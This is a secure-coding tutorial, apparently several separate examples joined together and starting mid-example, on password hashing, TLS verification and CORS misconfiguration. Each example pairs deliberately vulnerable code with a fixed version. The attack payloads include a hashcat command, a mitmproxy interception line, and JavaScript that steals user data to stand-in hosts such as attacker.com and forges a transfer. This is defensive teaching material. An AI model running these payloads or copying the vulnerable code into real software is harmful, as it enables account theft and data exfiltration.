**Attack Payload** (offline password cracking example):
```bash
# After an attacker steals your user table (e.g., via SQL injection or backup leak)
# they can run a GPU-accelerated cracker like hashcat:

hashcat -m 3200 hashes.txt /usr/share/wordlists/rockyou.txt
```

**Why This Is Dangerous**:
- Stores plaintext passwords alongside hashes, so any database leak directly exposes all user credentials.
- Uses a hard-coded, low-cost salt and custom concatenation, weakening bcrypt's protection and making hashes easier to crack offline.
- Leaks information about which usernames exist and lacks account lockout or logging, aiding credential stuffing and brute-force attacks.

**SECURE VERSION**:

```typescript
import express, { Request, Response, NextFunction } from 'express';
import bodyParser from 'body-parser';
import bcrypt from 'bcrypt';

interface UserRecord {
  id: number;
  username: string;
  // ✅ Store only the bcrypt hash
  passwordHash: string;
}

const app = express();
app.use(bodyParser.json());

let users: UserRecord[] = [];
let nextId = 1;

// Configuration
const BCRYPT_COST = 12; // Reasonable default for APIs (tune per environment)

// Simple input validation middleware
function validateCredentials(req: Request, res: Response, next: NextFunction) {
  const { username, password } = req.body;
  if (typeof username !== 'string' || typeof password !== 'string') {
    return res.status(400).json({ error: 'Invalid request body' });
  }
  if (username.length < 3 || username.length > 64) {
    return res.status(400).json({ error: 'Username length invalid' });
  }
  if (password.length < 12) {
    // Encourage strong passwords (in production, use a proper password policy)
    return res.status(400).json({ error: 'Password too short' });
  }
  next();
}

app.post('/secure-register', validateCredentials, async (req: Request, res: Response) => {
  const { username, password } = req.body;

  const existing = users.find(u => u.username === username);
  if (existing) {
    // Generic error to avoid user enumeration
    return res.status(400).json({ error: 'Unable to create account' });
  }

  try {
    // ✅ Use bcrypt's built-in salt generation with a proper cost factor
    const passwordHash = await bcrypt.hash(password, BCRYPT_COST);

    const user: UserRecord = {
      id: nextId++,
      username,
      passwordHash,
    };

    users.push(user);
    // Do not return hash
    res.status(201).json({ id: user.id, username: user.username });
  } catch (err) {
    console.error('Error hashing password', err);
    res.status(500).json({ error: 'Internal server error' });
  }
});

app.post('/secure-login', validateCredentials, async (req: Request, res: Response) => {
  const { username, password } = req.body;

  const user = users.find(u => u.username === username);

  // Use a dummy hash to mitigate timing attacks when user not found
  const dummyHash = '$2b$12$C6UzMDM.H6dfI/f/IKcEe.4Wq5sWSjjF/1nV64uYj5j8nqL6Y6Z7m';
  const hashToCheck = user ? user.passwordHash : dummyHash;

  try {
    const passwordMatches = await bcrypt.compare(password, hashToCheck);

    if (!user || !passwordMatches) {
      // Generic error avoids user enumeration
      console.warn('Failed login attempt for username:', username);
      return res.status(401).json({ error: 'Invalid credentials' });
    }

    // In production, issue a secure JWT or session here
    console.info('Successful login for userId:', user.id);
    res.json({ message: 'Logged in', userId: user.id });
  } catch (err) {
    console.error('Error during login', err);
    res.status(500).json({ error: 'Internal server error' });
  }
});

app.listen(3001, () => {
  console.log('Secure auth server running on http://localhost:3001');
});
```

**Key Security Controls**:
- Uses bcrypt correctly with automatically generated salts and an appropriate cost factor, making offline cracking significantly more expensive.
- Stores only password hashes (no plaintext) and returns generic error messages to reduce user enumeration and information leakage.
- Adds basic input validation, secure error handling, logging of suspicious events, and a dummy hash comparison to mitigate timing side-channels.

In production you need more than just correct bcrypt usage: you should tune cost per environment, add rate limiting, central logging, and structured audit events to detect and respond to abuse.

**PRODUCTION PATTERN**:

```typescript
import express, { Request, Response, NextFunction } from 'express';
import bodyParser from 'body-parser';
import bcrypt from 'bcrypt';
import rateLimit from 'express-rate-limit';
import helmet from 'helmet';

// Simulated persistent storage (replace with real DB in production)
interface UserRecord {
  id: number;
  username: string;
  passwordHash: string;
  failedLogins: number;
  lockedUntil?: Date;
}

const users: Map<string, UserRecord> = new Map();
let nextId = 1;

const app = express();
app.use(bodyParser.json());
app.use(helmet()); // Security headers

// Environment-specific configuration
const ENV = process.env.NODE_ENV || 'development';

// Tune bcrypt cost per environment
const BCRYPT_COST = ENV === 'production' ? 12 : 10;

// Rate limiting for login to slow brute-force and credential stuffing
const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 10, // 10 attempts per IP per window
  standardHeaders: true,
  legacyHeaders: false,
  handler: (req: Request, res: Response) => {
    auditLog('login_rate_limited', {
      ip: req.ip,
      username: req.body?.username,
    });
    res.status(429).json({ error: 'Too many login attempts. Please try again later.' });
  },
});

// Simple audit logging helper
function auditLog(event: string, details: Record<string, unknown>): void {
  const logEntry = {
    ts: new Date().toISOString(),
    env: ENV,
    event,
    ...details,
  };
  // In production, send to SIEM / centralized log system
  console.log(JSON.stringify(logEntry));
}

// Input validation middleware
function validateCredentials(req: Request, res: Response, next: NextFunction) {
  const { username, password } = req.body || {};
  if (typeof username !== 'string' || typeof password !== 'string') {
    return res.status(400).json({ error: 'Invalid request body' });
  }
  if (username.length < 3 || username.length > 64) {
    return res.status(400).json({ error: 'Invalid username or password' });
  }
  if (password.length < 12 || password.length > 128) {
    return res.status(400).json({ error: 'Invalid username or password' });
  }
  next();
}

// Account lockout thresholds
const MAX_FAILED_LOGINS = 5;
const LOCKOUT_MINUTES = 15;

function isAccountLocked(user: UserRecord): boolean {
  if (!user.lockedUntil) return false;
  return user.lockedUntil.getTime() > Date.now();
}

app.post('/prod-register', validateCredentials, async (req: Request, res: Response) => {
  const { username, password } = req.body;

  if (users.has(username)) {
    auditLog('registration_conflict', { username, ip: req.ip });
    return res.status(400).json({ error: 'Unable to create account' });
  }

  try {
    const passwordHash = await bcrypt.hash(password, BCRYPT_COST);
    const user: UserRecord = {
      id: nextId++,
      username,
      passwordHash,
      failedLogins: 0,
    };
    users.set(username, user);

    auditLog('registration_success', { userId: user.id, username, ip: req.ip });
    res.status(201).json({ id: user.id, username: user.username });
  } catch (err) {
    auditLog('registration_error', { username, ip: req.ip, error: String(err) });
    res.status(500).json({ error: 'Internal server error' });
  }
});

app.post('/prod-login', loginLimiter, validateCredentials, async (req: Request, res: Response) => {
  const { username, password } = req.body;
  const user = users.get(username);

  const dummyHash = '$2b$12$C6UzMDM.H6dfI/f/IKcEe.4Wq5sWSjjF/1nV64uYj5j8nqL6Y6Z7m';
  const hashToCheck = user ? user.passwordHash : dummyHash;

  try {
    // Check for lockout before bcrypt compare to reduce load on hot accounts
    if (user && isAccountLocked(user)) {
      auditLog('login_locked', { userId: user.id, username, ip: req.ip });
      return res.status(423).json({ error: 'Account temporarily locked' });
    }

    const passwordMatches = await bcrypt.compare(password, hashToCheck);

    if (!user || !passwordMatches) {
      if (user) {
        user.failedLogins += 1;
        if (user.failedLogins >= MAX_FAILED_LOGINS) {
          user.lockedUntil = new Date(Date.now() + LOCKOUT_MINUTES * 60 * 1000);
          auditLog('login_lockout', { userId: user.id, username, ip: req.ip });
        } else {
          auditLog('login_failed', {
            userId: user.id,
            username,
            ip: req.ip,
            failedLogins: user.failedLogins,
          });
        }
      } else {
        // Unknown user failed login
        auditLog('login_failed_unknown_user', { username, ip: req.ip });
      }

      return res.status(401).json({ error: 'Invalid credentials' });
    }

    // Reset failed login count on success
    user.failedLogins = 0;
    user.lockedUntil = undefined;

    // In production, generate JWT / session cookie with secure flags
    auditLog('login_success', { userId: user.id, username, ip: req.ip });
    res.json({ message: 'Logged in', userId: user.id });
  } catch (err) {
    auditLog('login_error', { username, ip: req.ip, error: String(err) });
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Global error handler as a final safety net
app.use((err: Error, _req: Request, res: Response, _next: NextFunction) => {
  auditLog('unhandled_error', { error: String(err) });
  res.status(500).json({ error: 'Internal server error' });
});

const PORT = process.env.PORT ? Number(process.env.PORT) : 4000;
app.listen(PORT, () => {
  console.log(`Production-style auth server running on http://localhost:${PORT} (${ENV})`);
});
```

**Defense in Depth Layers**:
1. **Strong password hashing with environment tuning**:
   - `const BCRYPT_COST = ENV === 'production' ? 12 : 10;`
   - Uses bcrypt with appropriate cost factor based on environment, allowing faster tests and stronger production security.
2. **Rate limiting and account lockout**:
   - `loginLimiter` caps login attempts per IP to slow down bots and credential stuffing.
   - Per-account `failedLogins` and `lockedUntil` protect targeted accounts from brute-force.
3. **Monitoring, audit logging, and secure error handling**:
   - `auditLog('login_failed', ...)`, `auditLog('login_lockout', ...)` enable detection of attacks and incident response.
   - Generic error messages and centralized logs avoid leaking sensitive implementation details to attackers while still providing observability.

**Additional Protections**:
- Always serve over HTTPS and set secure cookie flags (`Secure`, `HttpOnly`, `SameSite=Strict`) when issuing session tokens or JWTs.
- Integrate with a centralized SIEM / monitoring platform to alert on spikes in `login_failed` or `login_rate_limited` events and potential credential-stuffing campaigns.
- Implement optional multi-factor authentication (MFA) and user notifications for suspicious logins (new device, new location) to further reduce the impact of password compromise.

A common critical mistake is to "just make TLS work" by disabling certificate validation or using outdated cipher suites. That can completely break authentication security, even if you use strong passwords or tokens.

**VULNERABLE CODE**:

```rust
use actix_web::{post, web, App, HttpResponse, HttpServer, Responder};
use serde::Deserialize;
use reqwest::Client;

#[derive(Deserialize)]
struct LoginRequest {
    username: String,
    password: String,
}

#[post("/login")]
async fn login(form: web::Json<LoginRequest>) -> impl Responder {
    // VULNERABLE: HTTP client to call an internal auth service over TLS
    let client = Client::builder()
        // Dangerous: accept any certificate (including self-signed or forged)
        .danger_accept_invalid_certs(true)
        // Dangerous: ignore hostname mismatch (MITM with valid cert for other domain)
        .danger_accept_invalid_hostnames(true)
        .build()
        .unwrap();

    let res = client
        .post("https://auth.internal.local/verify")
        .json(&*form)
        .send()
        .await
        .unwrap();

    if res.status().is_success() {
        HttpResponse::Ok().body("Logged in")
    } else {
        HttpResponse::Unauthorized().body("Invalid credentials")
    }
}

#[actix_web::main]
async fn main() -> std::io::Result<()> {
    HttpServer::new(|| App::new().service(login))
        // Also vulnerable: using plain HTTP in production reverse proxy setups
        .bind(("0.0.0.0", 8080))?
        .run()
        .await
}
```

**Attack Payload** (TLS interception / forged cert):
```bash
# On attacker machine in a position to MITM (e.g., compromised router)
# 1. Obtain or create a certificate for attacker.com (or any domain)
# 2. Run a transparent proxy that presents this cert to the victim service
mitmproxy --mode transparent --ssl-insecure
```

This attack works here because the Rust client accepts any certificate and hostname. The attacker can proxy `https://auth.internal.local/verify`, see credentials in clear, and even spoof successful responses.

**Why This Is Dangerous**:
- Breaks TLS authentication: `danger_accept_invalid_certs(true)` disables cert validation, so any cert is trusted.
- Allows hostname spoofing: `danger_accept_invalid_hostnames(true)` lets a cert for some other domain be used to impersonate your auth service.
- Enables credential theft and auth bypass: a MITM can read passwords, modify responses, or always return 200 OK, bypassing real authentication.

**SECURE VERSION**:

```rust
use actix_web::{post, web, App, HttpResponse, HttpServer, Responder};
use actix_web::http::StatusCode;
use serde::Deserialize;
use reqwest::{Client, ClientBuilder};
use std::sync::Arc;
use std::time::Duration;
use tracing::{error, info};

#[derive(Deserialize)]
struct LoginRequest {
    username: String,
    password: String,
}

fn build_secure_client(auth_host: &str) -> anyhow::Result<Client> {
    // PRIMARY DEFENSE: use system roots and strict hostname verification
    let client = ClientBuilder::new()
        .https_only(true)
        .connect_timeout(Duration::from_secs(5))
        .timeout(Duration::from_secs(10))
        .user_agent("secure-auth-service/1.0")
        // Do NOT call danger_accept_invalid_certs / hostnames
        // Use default TLS backend with OS trust store
        .build()?;

    // Optionally: we can sanity check the auth_host format (defense in depth)
    if !auth_host.ends_with(".internal.local") {
        anyhow::bail!("Invalid auth host configuration");
    }

    Ok(client)
}

struct AppState {
    http_client: Client,
    auth_base_url: String,
}

#[post("/login")]
async fn login(data: web::Data<Arc<AppState>>, form: web::Json<LoginRequest>) -> impl Responder {
    // Basic input sanity check (defense in depth, not main auth)
    if form.username.len() > 128 || form.password.len() > 128 {
        return HttpResponse::BadRequest().body("Invalid input");
    }

    let url = format!("{}/verify", data.auth_base_url);

    let res = match data
        .http_client
        .post(&url)
        .json(&*form)
        .send()
        .await
    {
        Ok(r) => r,
        Err(e) => {
            error!(error = %e, "auth backend request failed");
            return HttpResponse::build(StatusCode::SERVICE_UNAVAILABLE)
                .body("Authentication service unavailable");
        }
    };

    if res.status().is_success() {
        info!(user = %form.username, "successful login");
        // Here you would issue a session token / cookie with secure flags
        HttpResponse::Ok().body("Logged in")
    } else if res.status() == StatusCode::UNAUTHORIZED {
        info!(user = %form.username, "failed login");
        HttpResponse::Unauthorized().body("Invalid credentials")
    } else {
        error!(
            status = %res.status(),
            "unexpected status from auth backend"
        );
        HttpResponse::build(StatusCode::SERVICE_UNAVAILABLE)
            .body("Authentication error")
    }
}

#[actix_web::main]
async fn main() -> std::io::Result<()> {
    tracing_subscriber::fmt::init();

    // In production this comes from environment / config management
    let auth_base_url = std::env::var("AUTH_BASE_URL")
        .unwrap_or_else(|_| "https://auth.internal.local".to_string());

    let client = build_secure_client(&auth_base_url)
        .expect("Failed to build secure HTTP client");

    let state = Arc::new(AppState {
        http_client: client,
        auth_base_url,
    });

    HttpServer::new(move || {
        App::new()
            .app_data(web::Data::new(Arc::clone(&state)))
            .service(login)
    })
    // Frontend should be behind a reverse proxy that terminates TLS
    .bind(("0.0.0.0", 8080))?
    .run()
    .await
}
```

**Key Security Controls**:
- Strict TLS verification: rely on the default `reqwest` configuration with system CA roots and hostname verification to ensure you only talk to the genuine auth server.
- Secure configuration management: the `AUTH_BASE_URL` is validated and not overridden programmatically with unsafe options, reducing misconfiguration risk.
- Robust error handling and logging: authentication service failures return generic errors to the client while logging details server-side for monitoring, preventing information leaks and aiding incident response.

In production you want strong defaults, explicit environment-specific configuration, and multiple guardrails so that debugging conveniences (like disabling cert checks) can’t sneak into prod. Mutual TLS (mTLS) adds another layer to authenticate services to each other.

**PRODUCTION PATTERN**:

```rust
use actix_web::{post, web, App, HttpResponse, HttpServer, Responder};
use actix_web::http::StatusCode;
use serde::Deserialize;
use reqwest::{Client, ClientBuilder};
use std::fs;
use std::sync::Arc;
use std::time::Duration;
use tracing::{error, info, warn};
use anyhow::Context;

#[derive(Deserialize)]
struct LoginRequest {
    username: String,
    password: String,
}

#[derive(Clone)]
struct TlsConfig {
    env: String,
    auth_base_url: String,
    ca_bundle_path: Option<String>,
    client_cert_path: Option<String>,
    client_key_path: Option<String>,
}

fn load_tls_config() -> anyhow::Result<TlsConfig> {
    let env = std::env::var("APP_ENV").unwrap_or_else(|_| "development".into());
    let auth_base_url = std::env::var("AUTH_BASE_URL")
        .unwrap_or_else(|_| "https://auth.internal.local".to_string());

    // In production, require explicit CA and client certs for mTLS
    let ca_bundle_path = std::env::var("AUTH_CA_BUNDLE").ok();
    let client_cert_path = std::env::var("AUTH_CLIENT_CERT").ok();
    let client_key_path = std::env::var("AUTH_CLIENT_KEY").ok();

    if env == "production" {
        if !auth_base_url.starts_with("https://") {
            anyhow::bail!("In production, AUTH_BASE_URL must use HTTPS");
        }
    }

    Ok(TlsConfig {
        env,
        auth_base_url,
        ca_bundle_path,
        client_cert_path,
        client_key_path,
    })
}

fn build_mtls_client(cfg: &TlsConfig) -> anyhow::Result<Client> {
    let mut builder = ClientBuilder::new()
        .https_only(true)
        .connect_timeout(Duration::from_secs(5))
        .timeout(Duration::from_secs(10))
        .user_agent("secure-auth-service/1.0")
        .pool_max_idle_per_host(8);

    // Defense in depth: pin to private CA if provided
    if let Some(ca_path) = &cfg.ca_bundle_path {
        let ca_bytes = fs::read(ca_path)
            .with_context(|| format!("Failed to read CA bundle at {}", ca_path))?;
        let ca_cert = reqwest::Certificate::from_pem(&ca_bytes)
            .context("Invalid CA bundle PEM")?;
        builder = builder.add_root_certificate(ca_cert);
    }

    // Mutual TLS: client cert + key for service-to-service auth
    if let (Some(cert_path), Some(key_path)) = (&cfg.client_cert_path, &cfg.client_key_path) {
        let cert_bytes = fs::read(cert_path)
            .with_context(|| format!("Failed to read client cert at {}", cert_path))?;
        let key_bytes = fs::read(key_path)
            .with_context(|| format!("Failed to read client key at {}", key_path))?;

        let id = reqwest::Identity::from_pkcs8_pem(&cert_bytes, &key_bytes)
            .context("Invalid client identity (PKCS#8)")?;
        builder = builder.identity(id);
    } else if cfg.env == "production" {
        // Fail-closed in production if mTLS is expected
        warn!("Production environment without client certs: mTLS disabled");
    }

    // NEVER call danger_accept_invalid_certs / hostnames
    let client = builder.build().context("Failed to build HTTP client")?;
    Ok(client)
}

struct AppState {
    http_client: Client,
    cfg: TlsConfig,
}

#[post("/login")]
async fn login(data: web::Data<Arc<AppState>>, form: web::Json<LoginRequest>) -> impl Responder {
    // Rate limiting would normally be done via middleware / external gateway.
    if form.username.len() > 128 || form.password.len() > 128 {
        return HttpResponse::BadRequest().body("Invalid input");
    }

    let url = format!("{}/verify", data.cfg.auth_base_url);

    let res = match data
        .http_client
        .post(&url)
        .json(&*form)
        .send()
        .await
    {
        Ok(r) => r,
        Err(e) => {
            error!(error = %e, "auth backend request failed");
            // Graceful degradation: don't expose internals
            return HttpResponse::build(StatusCode::SERVICE_UNAVAILABLE)
                .body("Authentication service unavailable");
        }
    };

    // Audit logging: only log usernames, never passwords or tokens
    if res.status().is_success() {
        info!(user = %form.username, "login_success");
        HttpResponse::Ok()
            .insert_header(("X-Content-Type-Options", "nosniff"))
            .insert_header(("X-Frame-Options", "DENY"))
            .insert_header(("X-XSS-Protection", "0"))
            .body("Logged in")
    } else if res.status() == StatusCode::UNAUTHORIZED {
        info!(user = %form.username, "login_failed");
        HttpResponse::Unauthorized()
            .insert_header(("X-Content-Type-Options", "nosniff"))
            .body("Invalid credentials")
    } else {
        error!(
            status = %res.status(),
            "unexpected status from auth backend"
        );
        HttpResponse::build(StatusCode::SERVICE_UNAVAILABLE)
            .insert_header(("X-Content-Type-Options", "nosniff"))
            .body("Authentication error")
    }
}

#[actix_web::main]
async fn main() -> std::io::Result<()> {
    tracing_subscriber::fmt::init();

    let cfg = load_tls_config().expect("invalid TLS configuration");
    info!(env = %cfg.env, "starting service");

    let client = build_mtls_client(&cfg).expect("failed to create TLS client");

    let state = Arc::new(AppState { http_client: client, cfg });

    // Environment-specific server config
    let bind_addr = if state.cfg.env == "production" {
        "0.0.0.0:8443"
    } else {
        "127.0.0.1:8080"
    };

    // TLS termination for inbound connections is typically done by a reverse proxy
    HttpServer::new(move || {
        App::new()
            .app_data(web::Data::new(Arc::clone(&state)))
            .service(login)
    })
    .bind(bind_addr)?
    .run()
    .await
}
```

**Defense in Depth Layers**:
1. **Strict TLS + mTLS for service-to-service auth**:
   ```rust
   let id = reqwest::Identity::from_pkcs8_pem(&cert_bytes, &key_bytes)?;
   builder = builder.identity(id); // client cert proves service identity
   ```
   This ensures both sides authenticate each other, preventing rogue services from impersonating the auth backend.

2. **Environment-specific, fail-closed configuration**:
   ```rust
   if env == "production" {
       if !auth_base_url.starts_with("https://") {
           anyhow::bail!("In production, AUTH_BASE_URL must use HTTPS");
       }
   }
   ```
   Production refuses unsafe URLs, so a misconfigured `http://` endpoint can't silently downgrade security.

3. **Monitoring, audit logging, and graceful degradation**:
   ```rust
   error!(error = %e, "auth backend request failed");
   return HttpResponse::build(StatusCode::SERVICE_UNAVAILABLE)
       .body("Authentication service unavailable");
   ```
   Errors are logged for alerting and debugging, but clients only see generic messages, preventing information leakage while maintaining availability.

**Additional Protections**:
- **Rate limiting and lockout**: implement per-IP and per-account rate limits (e.g., via a gateway or middleware) to reduce credential stuffing and brute-force attacks on the login endpoint.
- **Security headers and secure cookies**: ensure session cookies are `Secure`, `HttpOnly`, and `SameSite=Strict`, and add headers like `Strict-Transport-Security` at the reverse proxy to enforce HTTPS.
- **Certificate lifecycle management and pinning**: automate rotation of server and client certificates, and for high-sensitivity services consider certificate pinning or private CA roots to reduce the impact of public CA compromise or mis-issuance.

CORS (Cross-Origin Resource Sharing) errors occur when your frontend domain differs from your backend domain. While it's tempting to use wildcard (`*`) configurations to "fix" these errors quickly, this creates severe security vulnerabilities that allow any website to access your API on behalf of authenticated users.

**VULNERABLE CODE**:

```python
from flask import Flask, request, jsonify
from flask_cors import CORS

app = Flask(__name__)

# DANGEROUS: Allows ANY origin to access the API
CORS(app, origins="*", supports_credentials=True)

@app.route('/api/user/profile', methods=['GET'])
def get_profile():
    # Returns sensitive user data
    user_id = request.cookies.get('session_id')
    user_data = {
        'id': user_id,
        'email': 'user@company.com',
        'api_key': 'sk_live_abc123secret',
        'balance': 50000.00
    }
    return jsonify(user_data)

@app.route('/api/transfer', methods=['POST'])
def transfer_funds():
    # Performs sensitive financial action
    data = request.get_json()
    # Process transfer using authenticated session
    return jsonify({'status': 'success', 'transferred': data['amount']})

if __name__ == '__main__':
    app.run(debug=True)
```

**Attack Payload** (hosted on attacker's website):
```html
<script>
// Attacker's malicious page at https://evil-site.com
fetch('https://your-api.com/api/user/profile', {
    credentials: 'include'  // Sends victim's cookies
})
.then(response => response.json())
.then(data => {
    // Exfiltrate stolen data to attacker's server
    fetch('https://attacker.com/steal', {
        method: 'POST',
        body: JSON.stringify(data)
    });
});

// Perform unauthorized action
fetch('https://your-api.com/api/transfer', {
    method: 'POST',
    credentials: 'include',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({amount: 10000, to: 'attacker_account'})
});
</script>
```

**Why This Is Dangerous**:
- `origins="*"` allows any website to make requests to your API
- `supports_credentials=True` with wildcard origins allows cookies/authentication to be sent
- Attackers can create malicious websites that steal data from logged-in users
- Cross-Site Request Forgery (CSRF) attacks become trivial to execute
- Session tokens, API keys, and sensitive data can be exfiltrated

**SECURE VERSION**:

```python
from flask import Flask, request, jsonify, abort
from flask_cors import CORS
import os

app = Flask(__name__)

# SECURE: Explicitly whitelist allowed origins
ALLOWED_ORIGINS = [
    'https://myapp.com',
    'https://www.myapp.com',
    'https://admin.myapp.com'
]

# Development origin (only in non-production)
if os.environ.get('FLASK_ENV') == 'development':
    ALLOWED_ORIGINS.append('http://localhost:3000')

CORS(
    app,
    origins=ALLOWED_ORIGINS,
    supports_credentials=True,
    methods=['GET', 'POST', 'PUT', 'DELETE'],
    allow_headers=['Content-Type', 'Authorization', 'X-CSRF-Token'],
    expose_headers=['X-Request-Id'],
    max_age=3600  # Cache preflight for 1 hour
)

@app.route('/api/user/profile', methods=['GET'])
def get_profile():
    # Validate session before returning data
    session_id = request.cookies.get('session_id')
    if not validate_session(session_id):
        abort(401, 'Unauthorized')

    user_data = get_user_from_session(session_id)
    return jsonify(user_data)

def validate_session(session_id):
    # Implement proper session validation
    return session_id is not None and len(session_id) == 36

def get_user_from_session(session_id):
    # Fetch user data securely
    return {'id': 1, 'email': 'user@company.com'}

if __name__ == '__main__':
    app.run()
```

**Key Security Controls**:
- **Explicit origin whitelist**: Only trusted domains can make cross-origin requests
- **Environment-aware configuration**: Development origins only enabled in dev mode
- **Restricted methods and headers**: Limits what cross-origin requests can do
- **Credential scoping**: Cookies only sent to whitelisted origins
- **Preflight caching**: Reduces OPTIONS request overhead while maintaining security

CORS configuration is critical for API security. A common mistake is using wildcard origins which allows any website to make authenticated requests to your API, enabling credential theft and data exfiltration.

**VULNERABLE CODE**:

```javascript
const express = require('express');
const cors = require('cors');

const app = express();

// DANGEROUS: Allows ANY origin to access the API
app.use(cors({
  origin: '*',
  credentials: true  // This combination is especially dangerous
}));

// Even worse: Reflecting the origin header without validation
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', req.headers.origin);
  res.header('Access-Control-Allow-Credentials', 'true');
  res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE');
  res.header('Access-Control-Allow-Headers', 'Content-Type, Authorization');
  next();
});

app.get('/api/user/profile', (req, res) => {
  // Returns sensitive user data
  res.json({
    id: req.user.id,
    email: req.user.email,
    ssn: req.user.ssn,
    creditCard: req.user.paymentInfo
  });
});

app.listen(3000);
```

**Attack Payload**:
```html
<!-- Attacker hosts this on https://evil-site.com -->
<script>
fetch('https://victim-api.com/api/user/profile', {
  credentials: 'include'  // Sends victim's cookies
})
.then(response => response.json())
.then(data => {
  // Exfiltrate stolen data to attacker's server
  fetch('https://attacker-server.com/steal', {
    method: 'POST',
    body: JSON.stringify(data)
  });
});
</script>
```

**Why This Is Dangerous**:
- Wildcard `*` origin allows any website to make requests to your API
- Reflecting `req.headers.origin` without validation lets attackers bypass CORS entirely
- Combined with `credentials: true`, attackers can steal session cookies and authenticated data
- Enables cross-site request forgery (CSRF) attacks at scale

**SECURE VERSION**:

```javascript
const express = require('express');
const cors = require('cors');

const app = express();

// Define explicit allowlist of trusted origins
const ALLOWED_ORIGINS = [
  'https://www.myapp.com',
  'https://app.myapp.com',
  'https://admin.myapp.com'
];

// Add development origin only in non-production
if (process.env.NODE_ENV !== 'production') {
  ALLOWED_ORIGINS.push('http://localhost:3000');
}

const corsOptions = {
  origin: function(origin, callback) {
    // Allow requests with no origin (mobile apps, Postman) only if explicitly needed
    if (!origin) {
      // Reject or allow based on your security requirements
      return callback(new Error('Origin header required'), false);
    }

    if (ALLOWED_ORIGINS.includes(origin)) {
      callback(null, true);
    } else {
      console.warn(`Blocked CORS request from: ${origin}`);
      callback(new Error('Not allowed by CORS'), false);
    }
  },
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'DELETE'],
  allowedHeaders: ['Content-Type', 'Authorization'],
  maxAge: 86400  // Cache preflight for 24 hours
};

app.use(cors(corsOptions));

app.get('/api/user/profile', (req, res) => {
  res.json({
    id: req.user.id,
    email: req.user.email
    // Never expose SSN or full credit card in API responses
  });
});

app.listen(3000);
```

**Key Security Controls**:
- **Explicit origin allowlist**: Only trusted domains can make cross-origin requests
- **Origin validation function**: Dynamically validates each request against the allowlist
- **Logging blocked requests**: Enables detection of attack attempts
- **Environment-aware configuration**: Development origins only allowed in non-production

For dynamic subdomains, you need secure pattern matching that prevents subdomain takeover attacks. Never use simple string operations like `endsWith()` without proper validation, as attackers can register domains like `evil-myapp.com`.

**PRODUCTION PATTERN**:

```javascript
const express = require('express');
const cors = require('cors');
const helmet = require('helmet');
const rateLimit = require('express-rate-limit');
const winston = require('winston');

const app = express();

// Security logging
const logger = winston.createLogger({
  level: 'info',
  format: winston.format.json(),
  transports: [
    new winston.transports.File({ filename: 'security.log' })
  ]
});

// Secure subdomain pattern - anchored regex prevents bypass
const ORIGIN_PATTERNS = [
  /^https:\/\/([a-z0-9-]+\.)?myapp\.com$/,  // *.myapp.com
  /^https:\/\/([a-z0-9-]+\.)?myapp\.io$/    // *.myapp.io
];

// Explicit allowlist for non-subdomain origins
const EXPLICIT_ORIGINS = new Set([
  'https://partner-app.com',
  'https://trusted-vendor.com'
]);

function isOriginAllowed(origin) {
  if (!origin) return false;

  // Check explicit allowlist first
  if (EXPLICIT_ORIGINS.has(origin)) return true;

  // Check subdomain patterns with anchored regex
  for (const pattern of ORIGIN_PATTERNS) {
    if (pattern.test(origin)) return true;
  }

  return false;
}

const corsOptions = {
  origin: function(origin, callback) {
    // Require origin header for all requests
    if (!origin) {
      logger.warn({
        event: 'cors_no_origin',
        timestamp: new Date().toISOString()
      });
      return callback(new Error('Origin required'), false);
    }

    if (isOriginAllowed(origin)) {
      callback(null, true);
    } else {
      logger.warn({
        event: 'cors_blocked',
        origin: origin,
        timestamp: new Date().toISOString()
      });
      callback(new Error('CORS policy violation'), false);
    }
  },
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'PATCH'],
  allowedHeaders: [
    'Content-Type',
    'Authorization',
    'X-Requested-With',
    'X-CSRF-Token'
  ],
  exposedHeaders: ['X-Request-Id'],
  maxAge: 86400,  // 24 hour preflight cache
  preflightContinue: false,
  optionsSuccessStatus: 204
};

// Apply security headers first
app.use(helmet({
  crossOriginResourcePolicy: { policy: 'same-origin' },
  crossOriginOpenerPolicy: { policy: 'same-origin' },
  crossOriginEmbedderPolicy: { policy: 'require-corp' }
}));

// Rate limit preflight requests to prevent DoS
const preflightLimiter = rateLimit({
  windowMs: 60 * 1000,  // 1 minute
  max: 100,  // 100 preflight requests per minute
  message: 'Too many preflight requests'
});

app.options('*', preflightLimiter);
app.use(cors(corsOptions));

// Add request ID for tracing
app.use((req, res, next) => {
  const requestId = require('crypto').randomUUID();
  res.setHeader('X-Request-Id', requestId);
  req.requestId = requestId;
  next();
});

// Validate Referer header as additional check
function validateReferer(req, res, next) {
  const referer = req.headers.referer;
  const origin = req.headers.origin;

  if (referer && origin) {
    try {
      const refererOrigin = new URL(referer).origin;
      if (refererOrigin !== origin) {
        logger.warn({
          event: 'origin_referer_mismatch',
          origin: origin,
          referer: referer,
          requestId: req.requestId
        });
      }
    } catch (e) {
      // Invalid referer URL
    }
  }
  next();
}

app.use(validateReferer);

// Sensitive endpoints with additional CORS audit logging
app.get('/api/user/profile', (req, res) => {
  logger.info({
    event: 'sensitive_data_access',
    origin: req.headers.origin,
    userId: req.user?.id,
    requestId: req.requestId,
    timestamp: new Date().toISOString()
  });

  res.json({
    id: req.user.id,
    email: req.user.email
  });
});

// Health check endpoint with more permissive CORS
app.get('/health', cors({ origin: '*', credentials: false }), (req, res) => {
  res.json({ status: 'ok' });
});

app.listen(3000);
```

**Defense in Depth Layers**:

1. **Anchored Regex Validation**:
```javascript
// WRONG: Vulnerable to evil-myapp.com
origin.endsWith('myapp.com')

// CORRECT: Anchored regex with explicit subdomain pattern
/^https:\/\/([a-z0-9-]+\.)?myapp\.com$/
```

2. **Security Headers with Helmet**:
```javascript
// Prevents framing, clickjacking, and resource embedding attacks
app.use(helmet({
  crossOriginResourcePolicy: { policy: 'same-origin' },
  crossOriginOpenerPolicy: { policy: 'same-origin' }
}));
```

3. **Preflight Rate Limiting**:
```javascript
// Prevents CORS preflight DoS attacks
const preflightLimiter = rateLimit({
  windowMs: 60 * 1000,
  max: 100
});
app.options('*', preflightLimiter);
```

**Additional Protections**:
- **Monitoring dashboard**: Track blocked origins to detect attack patterns
- **Origin header required**: Reject requests without origin to prevent direct API abuse
- **Referer validation**: Cross-check origin and referer headers for anomalies
